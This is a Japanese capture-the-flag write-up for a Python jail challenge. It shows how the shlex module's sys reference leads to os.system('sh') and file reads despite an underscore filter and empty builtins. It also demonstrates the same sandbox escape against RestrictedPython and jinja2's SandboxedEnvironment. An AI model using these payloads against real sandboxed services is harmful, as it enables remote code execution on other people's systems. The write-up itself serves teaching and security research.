# You've Got Shlex

[English](./README.md)

## 問題文

Shlexただそれだけです！

## Writeup

### 概要

これはシンプルなPyjail（Pythonのサンドボックス脱出）問題です。入力はASCII文字である必要があり、またアンダースコア（`_`）を含めることはできません。ただし、環境内に `shlex` モジュールが用意されています。

```python
import shlex

code = input("jail >")

if not code.isascii():
    print("Not ascii")
    exit()

if "_" in code:
    print("No dunder methods/attributes")
    exit()

eval(code, {"shlex": shlex, "__builtins__": {}})
```

### 解法

この問題では、組み込み関数がすべて削除されています。[組み込み関数を使用せずにRCEを達成する方法](https://zenn.dev/tchen/articles/c75d9ee9d4c076)はいくつかありますが、そのすべてにおいてペイロードのどこかに `_` を含める必要があります（通常、dunder属性やメソッドにアクセスするためです）。

そのため、どうにかして `shlex` モジュールを利用する必要があります。公式ドキュメントによると、`shlex` モジュール内で定義されている関数やクラス自体はRCEに繋がるようなものではありません。そこで、与えられたオブジェクトの利用可能な属性を列挙する `dir` 関数を使って、`shlex` モジュールの属性を確認してみましょう。

```
>>> import shlex
>>> [x for x in dir(shlex) if "_" not in x]
['StringIO', 'join', 'quote', 'shlex', 'split', 'sys']
```

ここから、非常に面白そうな `sys` にアクセスできることがわかります。

例えば、`sys.breakpointhook()` は本質的に `breakpoint()` と同じであり、RCEに利用できる可能性があります。これが使えるか試してみましょう。

```
jail >shlex.sys.breakpointhook()
Traceback (most recent call last):
  File "/app/jail.py", line 14, in <module>
    eval(code, {"shlex": shlex, "__builtins__": {}})
    ~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "<string>", line 1, in <module>
KeyError: '__import__'
```

残念ながら、`__import__` が利用できない環境では `breakpoint()` を使用することはできません。

解決策は `sys.modules` を使用することです。これは現在ロードされているすべてのモジュールを格納している辞書です。`os` モジュールなどの一部のモジュールは、起動時のスクリプトで必要とされるため、すでにロードされています。これを利用して `os.system` にアクセスできます。

```
jail >shlex.sys.modules["os"].system("sh")
cat /flag*   
Alpaca{the_most_nonsensical_use_of_shlex_in_pyjail}
```

あるいは、すべての組み込み関数が含まれる `builtins` モジュールにアクセスすることもできます。

```
jail >shlex.sys.modules["builtins"].print(shlex.sys.modules["builtins"].open("/flag.txt").read())
Alpaca{the_most_nonsensical_use_of_shlex_in_pyjail}
```

## 余談

Pythonのサンドボックスにおいて、dunder属性へのアクセスを防ぐことは、環境の安全性を確保するための最も強力な方法の1つです。したがって、`sys` へのアクセスを許してしまうようなモジュールが存在することは、重大なセキュリティ脆弱性になり得ます。

例えば、`RestrictedPython` において、`_getitem_` の許可に加えて `shlex` モジュールへのアクセスを許可すると、以下のようにRCEが可能になります。

```python
from RestrictedPython import compile_restricted
from RestrictedPython import safe_globals
from RestrictedPython.Eval import default_guarded_getitem
import shlex

safe_globals['_getitem_'] = default_guarded_getitem

eval(compile_restricted("shlex.sys.modules['os'].system('sh')", '<inline>', 'eval'), safe_globals, {"shlex": shlex})
```

`jinja2.sandbox` においても、`shlex` へのアクセスを許可するとRCEが可能になります。

```python
from jinja2.sandbox import SandboxedEnvironment
import shlex

env = SandboxedEnvironment()

env.from_string("{{ shlex.sys.modules['os'].system('sh') }}").render(shlex=shlex)
```


## フラグ

`Alpaca{the_most_nonsensical_use_of_shlex_in_pyjail}`
